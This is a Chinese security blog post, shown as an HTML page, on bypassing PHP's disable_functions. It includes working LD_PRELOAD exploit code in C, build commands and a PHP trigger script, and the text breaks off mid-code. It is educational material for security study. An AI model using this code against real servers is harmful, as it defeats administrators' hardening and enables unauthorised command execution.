<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Bypass Disable_function (PHP) - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="Bypass Disable_function (PHP)" />
<meta property="og:description" content="花了点时间，总结了一下遇到的所有能够Bypass disable_function的方法，持续更新ing" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.h4ck.fun/bypass-disable_function-php/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-01-29T17:04:52+08:00" />
<meta property="article:modified_time" content="2021-10-09T13:57:38+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>

<meta name="twitter:title" content="Bypass Disable_function (PHP)"/>
<meta name="twitter:description" content="花了点时间，总结了一下遇到的所有能够Bypass disable_function的方法，持续更新ing"/>
<meta name="application-name" content="Leon&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/bypass-disable_function-php/" /><link rel="prev" href="https://blog.h4ck.fun/roarctf2020-writeup/" /><link rel="next" href="https://blog.h4ck.fun/thinkphp%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Bypass Disable_function (PHP)",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.h4ck.fun\/bypass-disable_function-php\/"
        },"genre": "posts","keywords": "RCE, UAF, Bypass","wordcount":  15589 ,
        "url": "https:\/\/blog.h4ck.fun\/bypass-disable_function-php\/","datePublished": "2021-01-29T17:04:52+08:00","dateModified": "2021-10-09T13:57:38+08:00","publisher": {
            "@type": "Organization",
            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                "@type": "Person",
                "name": "Leon"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Bypass Disable_function (PHP)</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://blog.h4ck.fun/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>Notes</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-29">2021-01-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;15589 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;32 minutes&nbsp;<span id="/bypass-disable_function-php/" class="leancloud_visitors" data-flag-title="Bypass Disable_function (PHP)">
                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                    </span>&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#ld_preload">LD_PRELOAD</a>
      <ul>
        <li><a href="#劫持函数">劫持函数</a>
          <ul>
            <li><a href="#思路">思路</a></li>
            <li><a href="#mail">mail()</a></li>
            <li><a href="#error_log">error_log()</a></li>
            <li><a href="#mb_send_mail">mb_send_mail()</a></li>
            <li><a href="#imap_mail">imap_mail()</a></li>
          </ul>
        </li>
        <li><a href="#非劫持函数">非劫持函数</a>
          <ul>
            <li><a href="#__attribute__介绍">__attribute__介绍</a></li>
            <li><a href="#利用">利用</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#imap_open">imap_open</a>
      <ul>
        <li><a href="#参考">参考</a></li>
        <li><a href="#利用-1">利用</a></li>
      </ul>
    </li>
    <li><a href="#imagick">Imagick</a>
      <ul>
        <li><a href="#简介">简介</a></li>
        <li><a href="#命令注入">命令注入</a></li>
        <li><a href="#ghostscript">Ghostscript</a></li>
        <li><a href="#ffmpeg">FFmpeg</a></li>
        <li><a href="#magick_coder_module_path">MAGICK_CODER_MODULE_PATH</a></li>
        <li><a href="#magick_configure_path">MAGICK_CONFIGURE_PATH</a></li>
      </ul>
    </li>
    <li><a href="#覆盖path">覆盖PATH</a></li>
    <li><a href="#exim4">Exim4</a></li>
    <li><a href="#dl">dl</a></li>
    <li><a href="#ffi">FFI</a>
      <ul>
        <li><a href="#tctf2020-noeasyphp">TCTF2020-noeasyphp</a></li>
      </ul>
    </li>
    <li><a href="#cgi">CGI</a>
      <ul>
        <li><a href="#简介-1">简介</a></li>
        <li><a href="#fastcgi">Fastcgi</a></li>
        <li><a href="#fastcginginxphp-fpm">Fastcgi(Nginx+php-fpm)</a></li>
        <li><a href="#mod-cgiapache_mod_php">Mod CGI(Apache_mod_php)</a></li>
      </ul>
    </li>
    <li><a href="#windows-com">Windows COM</a></li>
    <li><a href="#shellshock">ShellShock</a></li>
    <li><a href="#json-uaf-bypass">JSON UAF Bypass</a></li>
    <li><a href="#gc-bypass">GC Bypass</a></li>
    <li><a href="#backtrace-bypass">Backtrace Bypass</a></li>
    <li><a href="#spldoublylinkedlist-uaf">SplDoublyLinkedList UAF</a></li>
    <li><a href="#iconv">iconv</a></li>
    <li><a href="#user_filter">User_filter</a></li>
    <li><a href="#reference">Reference</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>花了点时间，总结了一下遇到的所有能够Bypass disable_function的方法，持续更新ing</p>
<h2 id="ld_preload">LD_PRELOAD</h2>
<h3 id="劫持函数">劫持函数</h3>
<blockquote>
<p>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
</blockquote>
<h4 id="思路">思路</h4>
<p>​		php 启动新进程 xxx，xxx内部调用系统函数 a()，a() 位于系统共享对象 a.so 中，所以系统为该进程加载a.so，如果在 a.so 前优先加载可控的 evil.so，evil.so 内含与 a() 同名的恶意函数，由于 evil.so 优先级较高，所以，xxx 将调用到 evil.so 内的 a() 函数，而非系统的 a.so 内的 a()函数，evil.so 为用户可控，达到执行恶意代码的目的。</p>
<p>​		如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过 <code>LD_PRELOAD</code> 来设置它优先加载我们自己编写的程序，实现劫持，前提是我得控制 php 启动外部程序(调用execve fock子进程)才行（只要有进程启动行为即可，无所谓是谁，因为新进程启动将重新LD_PRELOAD）</p>
<p>常见的PHP利用函数有<code>mail()、error_log()</code>，这两个函数为PHP自带，不需要安装其他扩展。</p>
<h4 id="mail">mail()</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">strace -f php ld_preload.php 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep execve  <span class="c1">#查看执行该php文件时所创建的进程</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20201019191420493.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20201019191420493.png, https://gitee.com/leonsec/images/raw/master/image-20201019191420493.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20201019191420493.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20201019191420493.png"
        title="image-20201019191420493" /></p>
<p>我们可以看到调用<code>mail()</code>函数时，创建了新进程调用系统函数<code>/usr/sbin/sendmail</code></p>
<p>其实这里除了第一个调用PHP解释器本身之外，还调用了<code>/bin/sh</code>，所以其实劫持<code>/bin/sh</code>调用的系统库函数也可以</p>
<p>当靶机系统上没有安装<code>sendmail</code>时，这里劫持<code>/bin/sh</code>的库函数就是一个突破点</p>
<blockquote>
<p>execve（执行文件）在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。
exec函数一共有六个，其中execve为内核级系统调用，其他（execl，execle，execlp，execv，execvp）都是调用execve的库函数
execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">readelf -Ws /usr/sbin/sendmail <span class="c1">#查看/usr/sbin/sendmail可能调用的系统库函数</span>
<span class="c1">#readelf -Ws /bin/sh</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20201019200607910.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20201019200607910.png, https://gitee.com/leonsec/images/raw/master/image-20201019200607910.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20201019200607910.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20201019200607910.png"
        title="image-20201019200607910" /></p>
<p>这里随便选一个可能调用的函数进行劫持，比如<code>getuid</code>：</p>
<p>编写exp.c：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">void</span> <span class="nf">payload</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;ls &gt; /tmp/leon&#34;</span><span class="p">);</span>
<span class="p">}</span>   
<span class="kt">int</span>  <span class="nf">getuid</span><span class="p">()</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
<span class="n">payload</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>编译成so文件：（这里注意编译的环境要与靶机相近）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -c -fPIC exp.c -o hack <span class="o">&amp;&amp;</span> gcc --share hack -o exp.so

<span class="c1">#如果想创建一个动态链接库，可以使用 GCC 的-shared选项。输入文件可以是源文件、汇编文件或者目标文件。</span>
<span class="c1">#另外还得结合-fPIC选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20201020210226181.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20201020210226181.png, https://gitee.com/leonsec/images/raw/master/image-20201020210226181.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20201020210226181.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20201020210226181.png"
        title="image-20201020210226181" /></p>
<p>编写test.php：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./exp.so&#34;</span><span class="p">);</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>执行test.php发现成功执行用户预定命令：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20201020211434920.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20201020211434920.png, https://gitee.com/leonsec/images/raw/master/image-20201020211434920.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20201020211434920.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20201020211434920.png"
        title="image-20201020211434920" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20201020211708742.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20201020211708742.png, https://gitee.com/leonsec/images/raw/master/image-20201020211708742.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20201020211708742.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20201020211708742.png"
        title="image-20201020211708742" /></p>
<p>劫持库函数时尽量找函数原型简单且常被调用的系统库函数，如<code>getuid()</code>、<code>getpid()</code>等</p>
<p>换一个没有安装<code>sendmail</code>的环境：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210122170617894.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210122170617894.png, https://gitee.com/leonsec/images/raw/master/image-20210122170617894.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210122170617894.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210122170617894.png"
        title="image-20210122170617894" /></p>
<p>同样的，<code>readelf -Ws /bin/sh</code>也调用了库函数<code>getuid()</code>，相同的步骤劫持也成功执行命令：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210122170806391.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210122170806391.png, https://gitee.com/leonsec/images/raw/master/image-20210122170806391.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210122170806391.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210122170806391.png"
        title="image-20210122170806391" /></p>
<h4 id="error_log">error_log()</h4>
<p>一样的调用了<code>/bin/sh</code>、<code>/usr/sbin/sendmail</code>，与<code>mail()</code>类似</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210122171924870.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210122171924870.png, https://gitee.com/leonsec/images/raw/master/image-20210122171924870.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210122171924870.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210122171924870.png"
        title="image-20210122171924870" /></p>
<h4 id="mb_send_mail">mb_send_mail()</h4>
<p>需要安装<code>mbstring</code>模块，利用与<code>mail()</code>类似</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210122172717080.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210122172717080.png, https://gitee.com/leonsec/images/raw/master/image-20210122172717080.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210122172717080.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210122172717080.png"
        title="image-20210122172717080" /></p>
<h4 id="imap_mail">imap_mail()</h4>
<p>需要安装<code>imap</code>模块，利用与<code>mail()</code>类似</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210122174507601.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210122174507601.png, https://gitee.com/leonsec/images/raw/master/image-20210122174507601.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210122174507601.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210122174507601.png"
        title="image-20210122174507601" /></p>
<p>除此之外还有<code>libvirt</code>模块的<code>libvirt_connect()</code>函数和<code>gnupg</code>模块的<code>gnupg_init()</code>函数，基本利用方式都是一样的，不做过多描述</p>
<h3 id="非劫持函数">非劫持函数</h3>
<h4 id="__attribute__介绍">__attribute__介绍</h4>
<blockquote>
<p>__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)</p>
<p>__attribute__语法格式为：__attribute__ ((attribute-list))
若函数被设定为constructor属性，则该函数会在main()函数执行之前被自动执行</p>
<p>类似的，若函数被设定为destructor属性，则该函数会在main()函数执行之后或者exit()被调用后自动执行</p>
<p>类似构造与析构函数</p>
</blockquote>
<p>若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数，所以无需考虑劫持某一函数，只要能ld_preload并执行php调用新进程，就能劫持共享对象从而bypass disable function</p>
<p>简单的exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;whoami &gt; /tmp/leon&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>但是<code>unsetenv()</code>可能在Centos上无效，因为Centos自己也hook了<code>unsetenv()</code>，在其内部启动了其他进程，来不及删除<code>LD_PRELOAD</code>就又被劫持，导致无限循环，可以使用全局变量 <code>extern char** environ</code>删除，实际上，<code>unsetenv() </code>就是对 environ 的简单封装实现的环境变量删除功能</p>
<p>在https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c看到了一个小技巧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// get command line options and arg
</span><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
    <span class="c1">// unset environment variable LD_PRELOAD.
</span><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
</span><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// executive command
</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>使用for循环修改<code>LD_PRELOAD</code>的首个字符改成<code>\0</code>，<code>\0</code>是C语言字符串结束标记，这样可以让系统原有的LD_PRELOAD环境变量自动失效</p>
<h4 id="利用">利用</h4>
<p>前提条件也是需要php启动子进程，只是不需要劫持特定的库函数了，修改exp如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="s">&#34;whoami &gt; /tmp/leon&#34;</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
